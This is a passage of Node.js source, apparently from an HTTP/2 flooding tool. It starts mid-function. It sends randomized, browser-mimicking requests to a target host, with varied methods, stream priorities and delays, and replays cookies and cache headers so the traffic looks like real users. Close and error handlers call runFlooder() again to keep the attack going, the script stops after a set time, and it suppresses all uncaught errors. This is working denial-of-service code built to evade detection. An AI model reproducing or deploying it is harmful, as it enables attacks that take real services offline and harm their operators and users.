                async function sendRequests() {
                    if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                        const navigationSequence = resourcePaths.slice(0, Math.floor(Math.random() * 3) + 1);

                        for (const resource of navigationSequence) {
                            const requestPromise = new Promise(async (resolve, reject) => {
                                const selectedPath = resource.path;
                                const secFetchDest = resource.dest;
                                const method = Math.random() < 0.95 ? "GET" : "HEAD";

                                const finalHeaders = {
                                    ":method": method,
                                    ":authority": baseHeaders[":authority"],
                                    ":scheme": baseHeaders[":scheme"],
                                    ":path": selectedPath,
                                    ...baseHeaders,
                                    "sec-fetch-dest": secFetchDest
                                };

                                const cookieHeader = sessionManager.getCookieHeader(parsedTarget.host);
                                if (cookieHeader) {
                                    finalHeaders['cookie'] = cookieHeader;
                                }

                                const cachedInfo = sessionManager.getCacheHeaders(selectedPath);
                                if (cachedInfo) {
                                    if (cachedInfo.etag) {
                                        finalHeaders['if-none-match'] = cachedInfo.etag;
                                    }
                                    if (cachedInfo.lastModified) {
                                        finalHeaders['if-modified-since'] = cachedInfo.lastModified;
                                    }
                                }

                                Object.keys(finalHeaders).forEach(key => finalHeaders[key] === undefined && delete finalHeaders[key]);

                                const req = client.request(finalHeaders, {
                                    weight: Math.random() < 0.5 ? 251 : 231,
                                    depends_on: 0,
                                    exclusive: Math.random() < 0.5 ? true : false,
                                })
                                .on('response', response => {
                                    console.log(`[Info] Request to ${selectedPath} - Status: ${response[':status']}`);
                                    const setCookie = response['set-cookie'];
                                    if (setCookie) {
                                        sessionManager.addCookies(parsedTarget.host, Array.isArray(setCookie) ? setCookie : [setCookie]);
                                    }

                                    const etag = response['etag'];
                                    const lastModified = response['last-modified'];
                                    if (etag || lastModified) {
                                        sessionManager.addCacheHeaders(selectedPath, etag, lastModified);
                                    }

                                    req.close(http2.constants.NO_ERROR);
                                    req.destroy();
                                    resolve();
                                })
                                .on('error', (err) => {
                                    console.log(`[Error] Request to ${selectedPath} failed: ${err.message}`);
                                    reject(err);
                                });

                                req.on('end', () => {
                                    resolve();
                                });

                                req.end();
                            });

                            await requestPromise.catch(() => {});
                            await new Promise(resolve => setTimeout(resolve, getRandomInt(1000, 3000)));
                        }
                    }
                }

                await sendRequests();
            }, getRandomInt(5000, 10000));
        });

        client.on("close", () => {
            console.log('[Info] HTTP/2 client closed');
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
            return runFlooder();
        });

        client.on("error", error => {
            console.log(`[Error] HTTP/2 client error: ${error.message}`);
            client.destroy();
            connection.destroy();
            return runFlooder();
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});